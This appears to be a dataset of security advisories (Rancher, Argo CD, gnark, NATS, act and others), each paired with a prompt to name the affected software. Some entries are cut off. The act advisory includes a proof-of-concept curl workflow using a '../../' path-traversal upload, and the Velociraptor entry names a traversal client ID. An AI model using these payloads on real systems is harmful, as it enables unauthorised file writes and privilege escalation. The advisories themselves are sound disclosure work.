values collected for attribute `http.request.method` were changed to be restricted to a set of well-known values and other high cardinality attributes were removed.\n\n### References\n\n- https://github.com/open-telemetry/opentelemetry-go-contrib/pull/4277\n- https://github.com/open-telemetry/opentelemetry-go-contrib/releases/tag/v1.19.0\n.

Please identify the software name affected by it. Input: ### Impact\nWhen the exponent is bigger than `r`, the group order of the pairing target group `GT`, the exponentiation \u00e0 la GLV (`ExpGLV`) can *sometimes* give incorrect results compared to normal exponentiation (`Exp`). \n\nThe issue impacts all users using `ExpGLV` for exponentiations in `GT`. This does not impact `Exp` and `ExpCyclotomic` which are sound. Also note that GLV methods in G1 and G2 are sound and _not_ impacted.\n\n### Patches\nFix has been implemented in pull request https://github.com/Consensys/gnark-crypto/pull/451 and merged in commit https://github.com/Consensys/gnark-crypto/commit/ec6be1a037f7c496d595c541a8a8d31c47bcfa3d to master branch.\n\nThe fix increased the bounds of the sub-scalars by 1. In fact, since https://github.com/Consensys/gnark-crypto/pull/213, we use a fast scalar decomposition that tradeoffs divisions (needed in the Babai rounding) by right-shifts. We precompute `b=2^m*v/d (m > log2(d))` and then at runtime compute `scalar*b/2^m` (`v` is a lattice vector and `d` the lattice determinant). This increases the bounds on sub-scalars by 1 which we check at runtime before increasing the loop size (we don't target constant-timeness). `m` is chosen to be a machine word twice big than `log2(d)` so that we rarely need to increase the loop size. Hence why the issue happens only *sometimes* if we omit to increase the bounds. This bounds increase was implemented in G1 and G2 but forgot in GT.\n\n### Workarounds\nUpdating to `v0.12.1+`. Alternatively, use `Exp` or `ExpCyclotomic` instead. We are not aware of any users using `ExpGLV` anyway.\n\n### References\n- Fix PR: https://github.com/Consensys/gnark-crypto/pull/451 \n- Fast scalar decomposition PR: https://github.com/Consensys/gnark-crypto/pull/213\n- https://eprint.iacr.org/2015/565 Sec.4.2\n\n### Acknowledgement\nThe vulnerability was reported by [Antonio Sanso](https://github.com/asanso) @ [EF](https://crypto.ethereum.org/).\n.

Please identify the software name affected by it. Input: Intel's RAPL (Running Average Power Limit) feature, introduced by the Sandy Bridge microarchitecture, provides software insights into hardware energy consumption. To facilitate this, Intel introduced the powercap framework in Linux kernel 3.13, which reads values via relevant MSRs (model specific registers) and provides unprivileged userspace access via `sysfs`. As RAPL is an interface to access a hardware feature, it is only available when running on bare metal with the module compiled into the kernel.\n\nBy 2019, it was realized that in some cases unprivileged access to RAPL readings could be exploited as a power-based side-channel against security features including AES-NI (potentially inside a SGX enclave) and KASLR (kernel address space layout randomization). Also known as the [PLATYPUS attack](https://platypusattack.com/), Intel assigned [CVE-2020-8694](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8694) and [CVE-2020-8695](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8695), and AMD assigned [CVE-2020-12912](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12912).\n\nSeveral mitigations were applied; Intel reduced the sampling resolution via a microcode update, and the Linux kernel [prevents access by non-root users](https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71) since 5.10. However, this kernel-based mitigation does not apply to many container-based scenarios:\n* Unless using user namespaces, root inside a container has the same level of privilege as root outside the container, but with a slightly more narrow view of the system\n* `sysfs` is mounted inside containers read-only; however only read access is needed to carry out this attack on an unpatched CPU\n\nWhile this is not a direct vulnerability in container runtimes, defense in depth and safe defaults are valuable and preferred, especially as this poses a risk to multi-tenant container environments running directly on affected hardware. This is provided by masking `/sys/devices/virtual/powercap` in the default mount configuration, and adding an additional set of rules to deny it in the default AppArmor profile.\n\nWhile `sysfs` is not the only way to read from the RAPL subsystem, other ways of accessing it require additional capabilities such as `CAP_SYS_RAWIO` which is not available to containers by default, or `perf` paranoia level less than 1, which is a non-default kernel tunable.\n\n## References\n\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8694\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-8695\n* https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2020-12912\n* https://platypusattack.com/\n* https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=949dd0104c496fa7c14991a23c03c62e44637e71\n* https://web.eece.maine.edu/~vweaver/projects/rapl/.

While the total number of requests is bounded by the http2.Server.MaxConcurrentStreams setting, resetting an in-progress request allows the attacker to create a new request while the existing one is still executing. \n\nWith the fix applied, HTTP/2 servers now bound the number of simultaneously executing handler goroutines to the stream concurrency limit (MaxConcurrentStreams).

Input: ### Impact\n\nDuring a security audit of Artifact Hub's code base, a security researcher at [OffSec](https://www.offsec.com/) identified a bug in which the `registryIsDockerHub` function was only checking that the registry domain had the `docker.io` suffix.\n\nArtifact Hub allows providing some Docker credentials that are used to increase the rate limit applied when interacting with the Docker Hub registry API to read publicly available content. Due to the incorrect check described above, it'd be possible to hijack those credentials by purchasing a domain which ends with `docker.io` and deploying a fake OCI registry on it.\n\n<https://artifacthub.io/> uses some credentials that only have permissions to read public content available in the Docker Hub.

In addition to the canonical decomposition of `a`, for small values there exists a second decomposition for `a+r` (where `r` is the modulus the values are being reduced by). The second decomposition was possible due to overflowing the field where the values are defined.\n\nInternally, the comparison methods `frontend.API.Cmp` and `frontend.API.IsLess` used binary decomposition and checked the bitwise differences. This allows a malicious prover to construct a valid proof for a statement `a < b` even if `a > b`.\n\nThe issue impacts all users using `API.Cmp` or `API.IsLess` methods. Additionally, it impacts the users using `bits.ToBinary` or `API.ToBinary` methods if full-width decomposition is requested (the default behaviour if no options are given).\n\nThe issues does not impact comparison methods in field emulation (package `std/math/emulated`) and dedicated comparison package (`std/math/cmp`).\n\n### Patches\n\nFix has been implemented in pull request #835 and merged in commit 59a4087261a6c73f13e80d695c17b398c3d0934f to master branch. The release v0.9.0 and onwards include the fix.\n\nThe fix added additional comparison of the decomposed bit-vector to the modulus of the in-circuit values.  \n\n### Workarounds\n\nUpgrading to version v0.9.0 should fix the issue without needing to change the calls to value comparison methods.\n\nAlternatively, users can use the `std/math/cmp` gadget, which additionally allows to bound the number of bits being compared, making the comparisons more efficient if the bound on the absolute difference of the values is known.\n\n### References\n\n* https://github.com/Consensys/gnark/pull/835\n* https://github.com/zkopru-network/zkopru/issues/116\n* https://github.com/iden3/circomlib/pull/48\n\n### Acknowledgement\n\nThe vulnerability was reported by [Marcin Kostrzewa](https://github.com/kustosz) @ [Reilabs](https://reilabs.io/)..

Input: ## Background\n\nNATS.io is a high performance open source pub-sub distributed communication technology, built for the cloud, on-premise, IoT, and edge computing.\n\nNATS users exist within accounts, and once using accounts, the old authorization block is not applicable.\n\n\n## Problem Description\n\nWithout any authorization rules in the nats-server, users can connect without authentication.\n\nBefore nats-server 2.2.0, all authentication and authorization rules for a nats-server lived in an \"authorization\" block, defining users.  With nats-server 2.2.0 all users live inside accounts.  When using the authorization block, whose syntax predates this, those users will be placed into the implicit global account, \"$G\".  Users inside accounts go into the newer \"accounts\" block.\n\nIf an \"accounts\" block is defined, in simple deployment scenarios this is often used only to enable client access to the system account.  When the only account added is the system account \"$SYS\", the nats-server would create an implicit user in \"$G\" and set it as the `no_auth_user` account, enabling the same \"without authentication\" logic as without any rules.\n\nThis preserved the ability to connect simply, and then add one authenticated login for system access.\n\nBut with an \"authorization\" block, this is wrong.  Users exist in the global account, with login rules.  And in simple testing, they might still connect fine without administrators seeing that authentication has been disabled.\n\nThe blind-spot on our part came from encouraging and documenting a switch to using only \"accounts\", instead of \"authorization\".\n\nIn the fixed versions, using an \"authorization\" block will inhibit the implicit creation of a \"$G\" user and setting it as the `no_auth_user` target.  In unfixed versions, just creating a second account, with no users, will also inhibit this behavior.\n\n\n## Affected versions\n\nNATS Server:\n * 2.2.0 up to and including 2.9.22 and 2.10.1\n * Fixed with nats-io/nats-server: 2.10.2 and backported to 2.9.23\n\n\n## Workarounds\n\nIn the \"accounts\" block, define a second non-system account, leave it empty.\n\n    accounts {\n        SYS: {\n            users: [\n                { user: sysuser, password: makemeasandwich }\n            ]\n        }\n        DUMMY: {}  # for security, before 2.10.2\n    }\n    system_account: SYS\n\n\n## Solution\n\nAny one of these:\n\n 1. Upgrade the NATS server to at least 2.10.2 (or 2.9.23)\n 2. Or define a dummy account\n 3. Or complete the migration of authorization entries to be inside a named account in the \"accounts\" block\n\n\n## Credits\n\nProblem reported by Alex Herrington.  \nAddressed publicly in a GitHub Discussion prior to this advisory..

Please identify the software name affected by it. Input: ### Impact\n\nThis issue affects Rancher versions from 2.5.0 up to and including 2.5.16, from 2.6.0 up to and including 2.6.9 and 2.7.0. It only affects Rancher setups that have an external [authentication provider](https://ranchermanager.docs.rancher.com/pages-for-subheaders/authentication-config) configured or had one configured in the past.\n\nIt was discovered that when an external authentication provider is configured in Rancher and then disabled, the Rancher generated [tokens](https://ranchermanager.docs.rancher.com/reference-guides/about-the-api/api-tokens) associated with users who had access granted through the now disabled auth provider are not revoked. This allows users to retain access to Rancher and `kubectl` access to clusters managed by Rancher, according to their previous configured permissions, even after they are supposed to have lost it due to the auth provider been disabled.\n\nThe problem also occurs if the auth provider is configured (and is still enabled) to use the [access level scopes](https://ranchermanager.docs.rancher.com/pages-for-subheaders/authentication-config) `allow members of clusters and projects, plus authorized users & groups` and `restrict access to only the authorized users & groups`. In this case, removing users and groups from the authorized lists will not revoke the access tokens and they will remain valid.\n\n\nAn example scenario is:\n\n1. OpenLDAP, MS Active Directory (AD) or any other external [authentication provider](https://ranchermanager.docs.rancher.com/pages-for-subheaders/authentication-config) is configured as an auth provider.\n2. A user (`cluster-owner`) is granted `cluster-owner` permissions on a downstream cluster (`test-cluster`).\n3. `cluster-owner` logs in using their external auth provider username and password.\n4. `cluster-owner` generates a `kubeconfig` token for `test-cluster`.\n5. The configured external auth provider is disabled.\n\nIn this scenario, the `kubeconfig` generated in step 4 will still be valid after step 5, and `test-cluster` can still be accessed using the `kubeconfig` token.\n\nBy default, tokens for authenticated session have their `ttl` (time to live) set to `960` minutes, so they will expire after `16` hours. `kubeconfig` tokens are configured to never expire, and their `ttl` is set to `0`. These configurations can be changed in the Rancher's settings (`Configuration > Global Settings > Settings`) with the [parameters](https://ranchermanager.docs.rancher.com/reference-guides/about-the-api/api-tokens)  `auth-user-session-ttl-minutes` and `kubeconfig-default-token-ttl-minutes`, respectively.\n\n### Workarounds\n\nIf you cannot update to a patched Rancher version, the recommended workaround is to review and remove tokens associated with auth providers manually.\n\nThe tokens can be reviewed by executing `kubectl get tokens` in Rancher's `local` cluster. Each found token must be manually reviewed to check if it belongs to a user from a disabled auth provider or a user who's access was previously removed from the auth provider (when the auth provider is still enabled and is or was configured to use access level scopes, as mentioned above). The identified tokens can be removed with `kubectl delete tokens <token_name>`.\n\nIt is important to mention that this workaround must be done every time an auth provider is disabled in case you cannot update to a patched version.\n\n### Patches\n\nPatched versions include releases 2.5.17, 2.6.10, 2.7.1 and later versions. After updating to a patched version, it is highly recommended to review the existing tokens and remove tokens related to disabled auth providers as described above in the workaround section.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/)..

Please identify the software name affected by it. Input: ### Impact\n\nAll versions of Argo CD starting with v1.8.2 are vulnerable to an improper authorization bug causing the API to accept certain invalid tokens.\n\nOIDC providers include an `aud` (audience) claim in signed tokens. The value of that claim specifies the intended audience(s) of the token (i.e. the service or services which are meant to accept the token). Argo CD _does_ validate that the token was signed by Argo CD's configured OIDC provider. But Argo CD _does not_ validate the audience claim, so it will accept tokens that are not intended for Argo CD.\n\nIf Argo CD's configured OIDC provider also serves other audiences (for example, a file storage service), then Argo CD will accept a token intended for one of those other audiences. Argo CD will grant the user privileges based on the token's `groups` claim, even though those groups were not intended to be used by Argo CD.\n\nThis bug also increases the blast radius of a stolen token. If an attacker steals a valid token for a different audience, they can use it to access Argo CD.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.6.0-rc5\n* v2.5.8\n* v2.4.20\n* v2.3.14\n\nThe patch introduces a new `allowedAudiences` to the OIDC config block. By default, the client ID is the only allowed audience. Users who _want_ Argo CD to accept tokens intended for a different audience may use `allowedAudiences` to specify those audiences.\n\n```yaml\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: argocd-cm\ndata:\n  oidc.config: |\n    name: Example\n    allowedAudiences:\n    - audience-1\n    - audience-2\n    - argocd-client-id  # If `allowedAudiences` is non-empty, Argo CD's client ID must be explicitly added if you want to allow it.\n``\n\nEven though [the OIDC spec requires the audience claim](https://openid.net/specs/openid-connect-core-1_0.html#IDToken), some tokens may not include it. To avoid a breaking change in a patch release, versions < 2.6.0 of Argo CD will skip the audience claim check for tokens that have no audience. In versions >= 2.6.0, Argo CD will reject all tokens which do not have an audience claim. Users can opt into the old behavior by setting an option:\n\n```yaml\napiVersion: v1\nkind: ConfigMap\nmetadata:\n  name: argocd-cm\ndata:\n  oidc.config: |\n    name: Example\n    skipAudienceCheckWhenTokenHasNoAudience: true\n```\n\n### Workarounds\n\nThere is no workaround besides upgrading.\n\n### Credits \n\nThe Argo CD team would like to express their gratitude to Vladimir Pouzanov (@farcaller) from Indeed, who discovered the issue, reported it confidentially according to our [guidelines](https://github.com/argoproj/argo-cd/blob/master/SECURITY.md#reporting-a-vulnerability), and actively worked with the project to provide a remedy.

It was discovered that the security advisory CVE-2021-36782 (GHSA-g7j7-h4q8-8w2f), previously released by Rancher, missed addressing some sensitive fields, secret tokens, encryption keys, and SSH keys that were still being stored in plaintext directly on Kubernetes objects like `Clusters`.\n\nThe exposed credentials are visible in Rancher to authenticated `Cluster Owners`, `Cluster Members`, `Project Owners` and `Project Members` of that cluster on the endpoints:\n\n- `/v1/management.cattle.io.cluster`\n- `/v1/management.cattle.io.clustertemplaterevisions`\n\nThe remaining sensitive fields are now stripped from `Clusters` and other objects and moved to a `Secret` before the object is stored. The `Secret` is retrieved when the credential is needed. For objects that existed before this security fix, a one-time migration happens on startup.\n\nThe fields that have been addressed by this security fix are:\n\n- `Cluster.Spec.RancherKubernetesEngineConfig.Services.KubeAPI.SecretsEncryptionConfig.CustomConfig.Providers[].AESGCM.Keys[].Secret`\n- `Cluster.Spec.RancherKubernetesEngineConfig.Services.KubeAPI.SecretsEncryptionConfig.CustomConfig.Providers[].AESCBC.Keys[].Secret`\n- `Cluster.Spec.RancherKubernetesEngineConfig.Services.KubeAPI.SecretsEncryptionConfig.CustomConfig.Providers[].SecretboxConfiguration.Keys[].Secret`\n- `Cluster.Spec.RancherKubernetesEngineConfig.Services.Kubelet.ExtraEnv` when containing the `AWS_SECRET_ACCESS_KEY` environment variable\n- `Cluster.Spec.RancherKubernetesEngineConfig.BastionHost.SSHKey`\n- `Cluster.Spec.RancherKubernetesEngineConfig.PrivateRegistries[].ECRCredentialPlugin.AwsSecretAccessKey`\n- `Cluster.Spec.RancherKubernetesEngineConfig.PrivateRegistries[].ECRCredentialPlugin.AwsSessionToken`\n- `Cluster.Spec.RancherKubernetesEngineConfig.Network.AciNetworkProvider.ApicUserKey`\n- `Cluster.Spec.RancherKubernetesEngineConfig.Network.AciNetworkProvider.KafkaClientKey`\n- `Cluster.Spec.RancherKubernetesEngineConfig.Network.AciNetworkProvider.Token`\n\n**Important:**\n\n- For the exposure of credentials not related to Rancher, the final impact severity for confidentiality, integrity and availability is dependent on the permissions the leaked credentials have on their services.\n\n- It is recommended to review for potentially leaked credentials in this scenario and to change them if deemed necessary.\n\n### Workarounds\n\nThere is no direct mitigation besides updating Rancher to a patched version.\n\n### Patches\n\nPatched versions include releases 2.5.17, 2.6.10, 2.7.1 and later versions.\n\nAfter upgrading to a patched version, it is important to check for the `ACISecretsMigrated` and `RKESecretsMigrated` conditions on `Clusters` and `ClusterTemplateRevisions` to confirm when secrets have been fully migrated off of those objects, and the objects scoped within them.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/)..

Input: Rapid7 Velociraptor did not properly sanitize the client ID parameter to the CreateCollection API, allowing a directory traversal in where the collection task could be written. It was possible to provide a client id of \"../clients/server\" to schedule the collection for the server (as a server artifact), but only require privileges to schedule collections on the client. Normally, to schedule an artifact on the server, the COLLECT_SERVER permission is required. This permission is normally only granted to \"administrator\" role. Due to this issue, it is sufficient to have the COLLECT_CLIENT privilege, which is normally granted to the \"investigator\" role. To exploit this vulnerability, the attacker must already have a Velociraptor user account at least \"investigator\" level, and be able to authenticate to the GUI and issue an API call to the backend. Typically, most users deploy Velociraptor with limited access to a trusted group, and most users will already be administrators within the GUI.

Please identify the software name affected by it. Input: ### Impact\n\nAn issue was discovered in Rancher versions from 2.5.0 up to and including 2.5.16 and from 2.6.0 up to and including 2.6.9, where an authorization logic flaw allows privilege escalation via project role template binding (PRTB) and `-promoted` roles. This issue is not present in Rancher 2.7 releases.\n\nNote: Consult Rancher [documentation](https://ranchermanager.docs.rancher.com/how-to-guides/new-user-guides/authentication-permissions-and-global-configuration/manage-role-based-access-control-rbac/cluster-and-project-roles) for more information about cluster and project roles and [KB 000020097](https://www.suse.com/support/kb/doc/?id=000020097) for information about `-promoted` roles.\n\nThis privilege escalation is possible for users with access to the `escalate` verb on PRTBs (`projectroletemplatebindings.management.cattle.io`), including users with `*` verbs on PRTBs (see notes below for more information). These users can escalate permissions for any `-promoted` resource (see the table below for a full enumeration) in any cluster where they have a PRTB granting such permissions in at least one project in the cluster.\n\nOn a default Rancher setup, only the following roles have such permissions:\n\n1. Project Owner\n2. Manage Project Members\n\nThese roles have permissions to affect the following resources:\n\n| Resource | API Group | Affected Rancher version |\n| - | - | - |\n| navlinks | ui.cattle.io | 2.6 |\n| nodes | \"\" | 2.6 |\n| persistentvolumes | \"\" | 2.5, 2.6 |\n| persistentvolumes | core | 2.5, 2.6 |\n| storageclasses | storage.k8s.io | 2.5, 2.6 |\n| apiservices | apiregistration.k8s.io | 2.5, 2.6 |\n| clusterrepos | catalog.cattle.io | 2.5, 2.6 |\n| clusters (`local` only) | management.cattle.io | 2.5, 2.6 |\n\nNotes:\n\n1. During the calculation of the CVSS score, `privileges required` was considered  as `high` because, by default, `standard user` and `user-base` users in Rancher do not have  `create`, `patch` and `update` permissions on `roletemplates`.\n2. If a role template with access to those objects was already created by another user in the cluster, then this issue can be exploited by users without the mentioned permissions from point 1.\n\n### Workarounds\n\nIf updating Rancher to a patched version is not possible, then the following workarounds must be observed to mitigate this issue:\n\n1. Only grant Project Owner and Manage Project Members roles to trusted users.\n5. Minimize the creation of custom roles that contain the `escalate`, `*` or write verbs (`create`, `delete`, `patch`, `update`) on `projectroletemplatebindings` resource, and only grant such custom roles to trusted users.\n6. Minimize the number of users that have permissions to `create`, `patch` and `update` `roletemplates`.\n\n### Patches\n\nPatched versions include releases 2.5.17 and 2.6.10 and later versions. This issue is not present in Rancher 2.7 releases.\n\n### Detection\n\nThe following script was developed to list role template bindings that give written access to the affected resources listed above.

Please identify the software name affected by it. Input: ### Impact\n\nAn issue was discovered in Rancher versions up to and including 2.6.9 and 2.7.0, where the `cattle-token` secret, used by the `cattle-cluster-agent`, is predictable. Even after the token is regenerated, it will have the same value. This issue is not present in Rancher 2.5 releases.\n\nThe `cattle-token` is used by Rancher's `cattle-cluster-agent` to connect to the Kubernetes API of Rancher provisioned downstream clusters. The problem occurs because the `cattle-token` secret does not use any random value in its composition, which causes it to always be regenerated with the same value. This can pose a serious problem if the token is compromised and needs to be recreated for security purposes.\n\nThe usage of the `cattle-token` by an unauthorized user allows to escalate privileges to the cluster owner of the affected downstream cluster. It does not allow access to Rancher's own local cluster (the cluster where Rancher is provisioned).\n\n### Workarounds\n\nIn case it is not possible to promptly update to a patched version, a workaround is to use the [rotate script](https://github.com/rancherlabs/support-tools/tree/master/rotate-tokens) provided in the public security advisory [CVE-2021-36782 / GHSA-g7j7-h4q8-8w2f](https://github.com/rancher/rancher/security/advisories/GHSA-g7j7-h4q8-8w2f), which facilitates the rotation and creation of a new unique downstream cluster token.\n\n### Patches\n\nPatched versions include releases 2.6.10, 2.7.1 and later versions.\n\nAfter upgrading to one of the patched versions, it is highly recommended to rotate the `cattle-token` in downstream clusters to guarantee that a new random token will be safely regenerated.\n\nThe procedure below can rotate the `cattle-token` and should be executed in each downstream cluster provisioned by Rancher. It is recommended to first test this process in an appropriate development/testing environment.\n\n```shell\n# Verify the current secret before rotating it\n$ kubectl describe secrets cattle-token -n cattle-system\n\n# Delete the secret\n$ kubectl delete secrets cattle-token -n cattle-system\n\n# Restart the cattle-cluster-agent deployment\n$ kubectl rollout restart deployment/cattle-cluster-agent -n cattle-system\n\n# Confirm that a new and different secret was generated\n$ kubectl describe secrets cattle-token -n cattle-system\n```\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/)..

Please identify the software name affected by it. Input: ### Impact\n\nAn issue was discovered in Rancher where an authorization logic flaw allows an authenticated user on any downstream cluster to (1) open a shell pod in the Rancher `local` cluster and (2) have limited `kubectl` access to it. The expected behavior is that a user does not have such access in the Rancher `local` cluster unless explicitly granted.\n\nThis issue does not allow the user to escalate privileges in the `local` cluster directly (this would require another vulnerability to be exploited).\n\nThe security issue happens in two different ways:\n\n1. Shell pod access - This is when a user opens a shell pod in the Rancher UI to a downstream cluster that the user has permission to access. The web request can be intercepted using the browser's web inspector/network console or a proxy tool to change the shell's destination to the Rancher `local` cluster instead of the desired downstream cluster.\n\n   - This flaw cannot be exploited to access a downstream cluster that the user has no permissions to.\n\n   - The shell pod runs with a limited non-root user, reducing the severity of this issue. However, even as a non-root user, it is still possible download and run binaries inside the shell pod.\n\n   - The blast radius of this issue can increase based on the configuration of the `local` cluster. For example:\n\n      - If the `local` cluster has unlimited network access, e.g. to the Internet, the user can open a reverse network connection to the shell pod.\n\n      - Or access the cloud metadata API of the underlying cloud infrastructure, where the user can extract the credentials associated with the `local` cluster and use them to interact with the cloud environment (this will be limited by the permissions granted to the cloud credentials in question). \n\n      - Check further recommendations about liming access to the cloud metadata API in Rancher's [security best practices](https://ranchermanager.docs.rancher.com/reference-guides/rancher-security/kubernetes-security-best-practices).\n\n2. Kubectl access - When downloading the kubeconfig file of a downstream cluster that the user has access to, the `server` cluster address in the kubeconfig file can be changed to point to the Rancher `local` cluster instead of the intended downstream cluster.\n\n     - This can also be achieved by crafting a kubeconfig using a Rancher token instead of using the kubeconfig from an active cluster. \n\n    - This flaw cannot be exploited to access a downstream cluster that the user has no permissions to.\n\nNotes:\n- Rancher `local` cluster means the cluster where Rancher is installed. It is named as `local` inside the list of clusters in the Rancher UI.\n- Audit logs in Rancher can be used to identify possible abuses of this issue, by tracking API requests to the user ID of the user that performed the action. API audit logs can be enabled as described in the [documentation](https://ranchermanager.docs.rancher.com/how-to-guides/advanced-user-guides/enable-api-audit-log) when set to level `1` or above.\n\n### Workarounds\n\nThere is no workaround or direct mitigation besides updating to a patched Rancher version.\n\n### Patches\n\nPatched versions include releases 2.5.17, 2.6.10, 2.7.1 and later versions.\n\n### For more information\n\nIf you have any questions or comments about this advisory:\n\n* Reach out to [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries.\n* Open an issue in [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository.\n* Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support lifecycle](https://www.suse.com/lifecycle/)..

Input: ### Impact\n\nWhen the scs-library-client is used to pull a container image, with authentication, the HTTP Authorization header sent by the client to the library service may be incorrectly leaked to an S3 backing storage provider.

An attacker with access to the S3 service may be able to extract user credentials, allowing them to impersonate the user.\n\nThe vulnerable multi-part concurrent download flow, with redirect to S3, is only used when communicating with a Singularity Enterprise 1.x installation, or third party server implementing this flow.\n\nInteraction with Singularity Enterprise 2.x, and Singularity Container Services (cloud.sylabs.io), does not trigger the vulnerable flow.\n\nWe encourage all users to update.

Input: ### Impact\n\nAll Argo CD versions starting with 2.5.0-rc1 are vulnerable to an authorization bypass bug which allows a malicious Argo CD user to deploy Applications outside the configured allowed namespaces. \n\n#### Description of exploit\n\nReconciled Application namespaces are specified as a comma-delimited list of glob patterns. When sharding is enabled on the Application controller, it does not enforce that list of patterns when reconciling Applications. For example, if Application namespaces are configured to be `argocd-*`, the Application controller may reconcile an Application installed in a namespace called `other`, even though it does not start with `argocd-`.\n\nReconciliation of the out-of-bounds Application is only triggered when the Application is updated, so the attacker must be able to cause an update operation on the Application resource.\n\n#### Limitations\n\nThis bug only applies to users who have explicitly enabled the \"apps-in-any-namespace\" feature by setting `application.namespaces` in the argocd-cmd-params-cm ConfigMap or otherwise setting the `--application-namespaces` flags on the Application controller and API server components. The apps-in-any-namespace feature is in beta as of this Security Advisory's publish date.\n\nThe bug is also limited to Argo CD instances where sharding is enabled by increasing the `replicas` count for the Application controller.\n\nFinally, the AppProjects' `sourceNamespaces` field acts as a secondary check against this exploit. To cause reconciliation of an Application in an out-of-bounds namespace, an AppProject must be available which permits Applications in the out-of-bounds namespace.\n\n### Patches\n\nA patch for this vulnerability has been released in the following Argo CD versions:\n\n* v2.5.8\n* v2.6.0-rc5\n\n### Workarounds\n\nRunning only one replica of the Application controller will prevent exploitation of this bug.\n\nMaking sure all AppProjects' `sourceNamespaces` are restricted within the confines of the configured Application namespaces will also prevent exploitation of this bug.\n\n### Credits\n\nThanks to ChangZhuo Chen (@czchen) for finding the issue and for contributing the fix!\n\n### References\n\n* [Documentation for apps-in-any-namespace](https://argo-cd--10678.org.readthedocs.build/en/10678/operator-manual/app-any-namespace/)\n\n### For more information\n\n* Open an issue in [the Argo CD issue tracker](https://github.com/argoproj/argo-cd/issues) or [discussions](https://github.com/argoproj/argo-cd/discussions)\n* Join us on [Slack](https://argoproj.github.io/community/join-slack) in channel #argo-cd\n\n.

Input: ### Impact\nA vulnerability in GitOps run could allow a local user or process to alter a Kubernetes cluster's resources.\n\nGitOps run has a local S3 bucket which it uses for synchronising files that are later applied against a Kubernetes cluster. Its endpoint had no security controls to block unauthorised access, therefore allowing local users (and processes) on the same machine to see and alter the bucket content.\n\nBy leveraging this vulnerability, an attacker could pick a workload of their choosing and inject it into the S3 bucket, which resulted in the successful deployment in the target cluster, without the need to provide any credentials to either the S3 bucket nor the target Kubernetes cluster.\n\n### Patches\nThis vulnerability has been fixed by commits [75268c4](https://github.com/weaveworks/weave-gitops/pull/3114/commits/75268c4d2c8f7e4db22c63d76b451ba6545d117f) and [966823b](https://github.com/weaveworks/weave-gitops/pull/3102/commits/966823bbda8c539a4661e2a4f8607c9307ba6225).

Please identify the software name affected by it. Input: ### Impact\nThe artifact server that stores artifacts from Github Action runs does not sanitize path inputs. This allows an attacker to download and overwrite arbitrary files on the host from a Github Action. This issue may lead to privilege escalation.\n\n\n#### Issue 1: Arbitrary file upload in artifact server (GHSL-2023-004)\nThe [/upload endpoint](https://github.com/nektos/act/blob/v0.2.35/pkg/artifacts/server.go#LL103C2-L103C2) is vulnerable to path traversal as filepath is user controlled, and ultimately flows into os.Mkdir and os.Open.\n\n```\nrouter.PUT(\"/upload/:runId\", func(w http.ResponseWriter, req *http.Request, params httprouter.Params) {\n\t\titemPath := req.URL.Query().Get(\"itemPath\")\n\t\trunID := params.ByName(\"runId\")\n\n\t\tif req.Header.Get(\"Content-Encoding\") == \"gzip\" {\n\t\t\titemPath += gzipExtension\n\t\t}\n\n\t\tfilePath := fmt.Sprintf(\"%s/%s\", runID, itemPath)\n```\n\n#### Issue 2: Arbitrary file download in artifact server (GHSL-2023-004)\nThe [/artifact endpoint](https://github.com/nektos/act/blob/v0.2.35/pkg/artifacts/server.go#L245) is vulnerable to path traversal as the path is variable is user controlled, and the specified file is ultimately returned by the server.\n\n```\nrouter.GET(\"/artifact/*path\", func(w http.ResponseWriter, req *http.Request, params httprouter.Params) {\n\t\tpath := params.ByName(\"path\")[1:]\n\n\t\tfile, err := fsys.Open(path)\n```\n\n#### Proof of Concept\nBelow I have written a Github Action that will upload secret.txt into the folder above the specified artifact directory. The first call to curl will create the directory named 1 if it does not already exist, and the second call to curl will upload the secret.txt file to the directory above the specified artifact directory.\n\nWhen testing this POC, the `--artifact-server-path` parameter must be passed to act in order to enable the artifact server.\nReplace yourIPandPort with the IP and port of the server. An attacker can enumerate /proc/net/tcp in order to find the artifact server IP and port, but this is out of the scope of this report. Please let me know if you would like a copy of this script.\n\n```\nname: CI\non: push\n\njobs:\n  test:\n    runs-on: ubuntu-latest\n    steps:\n    - run: echo \"Here are some secrets\" > secret.txt\n    - run: curl http://<yourIPandPort>/upload/1?itemPath=secret.txt --upload-file secret.txt\n    - run: curl http://<yourIPandPort>/upload/1?itemPath=../../secret.txt --upload-file secret.txt\n```\n\n### Remediation\n1. During implementation of [Open and OpenAtEnd for FS](https://github.com/nektos/act/blob/master/pkg/artifacts/server.go#L65), please ensure to use ValidPath() to check against path traversal. See more here: https://pkg.go.dev/io/fs#FS\n2. Clean the user-provided paths manually\n\n### Patches\nVersion 